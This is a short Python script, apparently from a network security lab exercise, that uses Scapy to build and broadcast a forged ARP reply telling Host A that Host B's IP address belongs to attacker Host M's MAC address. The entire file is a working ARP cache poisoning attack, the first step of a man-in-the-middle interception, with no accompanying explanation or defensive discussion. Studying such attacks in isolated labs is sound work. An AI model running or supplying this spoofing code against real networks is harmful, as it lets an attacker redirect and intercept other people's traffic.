#!/usr/bin/python3
from scapy.all import *

# Define IP and MAC addresses
A_IP = "10.0.2.5"  # Host A's IP(dst)
B_IP = "10.0.2.6"  # Host B's IP(stc spoofed)
M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC
A_MAC = "ff:ff:ff:ff:ff:ff"
# Create Ethernet frame (destination is Host A's MAC)
E = Ether(dst=A_MAC)  # Broadcast to all devices

# Create ARP reply packet
A = ARP(op=2, psrc=B_IP, hwsrc=M_MAC,hwdst = A_MAC,pdst=A_IP)

# Combine Ethernet and ARP into a single packet
pkt = E/A

# Send the packet
sendp(pkt)